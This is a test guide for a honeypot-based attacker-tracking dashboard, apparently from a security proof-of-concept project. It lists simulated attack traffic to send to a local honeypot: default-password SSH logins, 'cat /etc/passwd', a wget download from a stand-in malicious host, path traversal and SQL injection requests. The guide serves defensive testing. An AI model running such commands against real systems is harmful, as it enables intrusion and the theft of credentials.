# Quick Test Guide - Attacker Tracking Feature

## 🚀 Quick Start

### 1. Start the Dashboard
```cmd
cd e:\nos\Network_Security_poc\dashboard
start_dashboard.bat
```

### 2. Start the Honeypot
1. Open browser: `http://localhost:5000`
2. Click **"Honeypot"** page in navigation
3. Scroll to **"Honeypot Control"** section
4. Click **"Start Honeypot"** button
5. Wait for status to change to **"RUNNING"** (green)

### 3. View Attacker Sections
Scroll down on the Honeypot page to see 4 new sections:

#### Section 1: Detected Attackers (Statistics)
- **Total Attacks:** 0
- **Unique IPs:** 0
- **Credentials Tried:** 0
- **Commands Executed:** 0

#### Section 2: Attacker Details List
Shows all attacking IPs with full interaction history

#### Section 3: Captured Credentials
Shows all username/password combinations tried

#### Section 4: SSH Commands Executed
Shows all commands attackers ran

#### Section 5: HTTP Requests
Shows all HTTP traffic to honeypot

## 🧪 Generate Test Traffic

### SSH Attack Simulation
```cmd
REM From Windows CMD
ssh -p 2222 admin@localhost
REM When prompted for password, try: admin123
REM Or: password
REM Or: 123456
```

### SSH Commands Test
Once connected (even if auth fails, some honeypots capture commands):
```bash
ls -la
cat /etc/passwd
whoami
ps aux
netstat -an
wget http://malicious-site.com/script.sh
chmod +x malware.bin
sudo su
```

### HTTP Attack Simulation
Open these URLs in browser:
```
http://localhost:8080/admin
http://localhost:8080/admin/login
http://localhost:8080/phpmyadmin
http://localhost:8080/wp-admin
http://localhost:8080/../../../etc/passwd
```

### Using curl (Advanced)
```cmd
REM GET request
curl http://localhost:8080/admin

REM POST with credentials
curl -X POST http://localhost:8080/admin/login -d "username=admin&password=admin123"

REM SQL Injection attempt
curl "http://localhost:8080/search?q=1' OR '1'='1"

REM Custom User-Agent
curl -A "Malicious-Bot/1.0" http://localhost:8080/
```

## ✅ Verification Checklist

### Empty State (Before Traffic)
- [ ] "Detected Attackers" shows 0 in all counters
- [ ] Attacker list shows: "No attackers detected yet"
- [ ] Credentials section shows: "No credential attempts captured"
- [ ] Commands section shows: "No SSH commands executed yet"
- [ ] HTTP requests shows: "No HTTP requests captured"

### With Traffic (After Attack Simulation)
- [ ] Counters update with non-zero values
- [ ] Attacker IP appears in list with red border
- [ ] Credentials show username/password attempts
- [ ] Commands show with color coding:
  - Red = destructive (rm, delete)
  - Orange = download (wget, curl)
  - Green = recon (ls, cat)
  - Purple = privilege (sudo, chmod)
- [ ] HTTP requests show method badges (GET, POST)

### Auto-Refresh (Wait 5 Seconds)
- [ ] Counters update automatically
- [ ] New data appears without manual refresh
- [ ] Timestamps show recent activity

### Manual Refresh
- [ ] Click "Refresh" button in each section
- [ ] Data updates immediately
- [ ] No errors in browser console (F12)

## 🔍 Debugging

### Check API Endpoint
```
http://localhost:5000/api/honeypot/attackers
```
Should return JSON with:
```json
{
  "success": true,
  "attackers": [...],
  "total_attacks": 0,
  "unique_ips": 0,
  "credentials_tried": [...],
  "commands_executed": [...],
  "http_requests": [...],
  "rerouted_devices": [...]
}
```

### Check Honeypot Logs
```cmd
cd e:\nos\Network_Security_poc\honey_pot\logs
type beelzebub.log
```

### Check Browser Console
1. Press **F12** in browser
2. Go to **Console** tab
3. Look for errors (red text)
4. Should see: "Fetching attacker data..." when refreshing

### Check Network Tab
1. Press **F12** in browser
2. Go to **Network** tab
3. Filter by **XHR**
4. Look for `/api/honeypot/attackers` request
5. Status should be **200 OK**
6. Response should be JSON data

## 📊 Expected Results

### After SSH Attack
```
Detected Attackers
├── Total Attacks: 5
├── Unique IPs: 1
├── Credentials Tried: 3
└── Commands Executed: 8

Attacker List
└── 127.0.0.1 (5 interactions)
    ├── Protocols: SSH
    ├── Ports: 2222
    └── First Seen: 2024-10-27 10:30:45

Captured Credentials
├── admin / admin123 (SSH) - 1x
├── admin / password (SSH) - 1x
└── admin / 123456 (SSH) - 1x

SSH Commands
├── ls -la (2x)
├── cat /etc/passwd (1x)
├── whoami (1x)
├── wget http://... (1x)
└── sudo su (1x)
```

### After HTTP Attack
```
HTTP Requests
├── GET /admin (1x)
├── GET /admin/login (1x)
├── POST /admin/login (1x)
├── GET /phpmyadmin (1x)
└── GET /../../../etc/passwd (1x)
```

## 🎨 Visual Features to Verify

### Color Coding
- **Attackers:** Red border-left, skull icon
- **Credentials:** Yellow/orange border, key icon
- **Commands:** Blue/red/green/purple based on type
- **HTTP:** Green border, globe icon

### Icons
- 💀 Skull for attackers
- 🔑 Key for credentials
- 💻 Terminal for commands
- 🌐 Globe for HTTP requests
- 🔄 Redo for retry counts
- 🕒 Clock for timestamps

### Layout
- Cards with 3px left border
- Rounded corners (4px)
- Padding: 12-15px
- Semi-transparent backgrounds
- Monospace font for technical data

## ⚠️ Troubleshooting

### "No data" but attacks were sent
1. Check honeypot logs exist:
   ```cmd
   dir honey_pot\logs\beelzebub.log
   ```
2. Verify log format is JSONL (one JSON per line)
3. Check backend parsing in `app.py` line 497+

### API returns empty arrays
1. Honeypot might not be logging correctly
2. Check Docker logs:
   ```cmd
   docker logs beelzebub-honeypot
   ```
3. Verify environment variables loaded:
   ```cmd
   docker inspect beelzebub-honeypot | findstr GLM_KEY
   ```

### JavaScript errors in console
1. Check element IDs match:
   - HTML: `id="attacker-list"`
   - JS: `document.getElementById('attacker-list')`
2. Verify functions defined before calling
3. Clear browser cache (Ctrl+F5)

### Sections not visible
1. Check you're on Honeypot page (not Logs tab)
2. Scroll down below "Rerouted IPs" section
3. Look for "Detected Attackers" heading

## 📝 Notes

- **Auto-refresh:** Every 5 seconds when on Honeypot page
- **Manual refresh:** Click "Refresh" button in each section
- **Log format:** Beelzebub outputs JSONL (JSON Lines)
- **Real-time:** Data updates as attacks happen
- **Empty state:** All sections show friendly messages when no data

## 🎯 Success Criteria

✅ **Feature is working if:**
1. Empty state messages appear initially
2. Counters update after attack simulation
3. Attacker details appear in all 4 sections
4. Auto-refresh updates data every 5 seconds
5. Color coding applies correctly
6. No JavaScript errors in console
7. API endpoint returns valid JSON

---

**Ready to test!** Follow the steps above to verify the attacker tracking feature is working correctly.
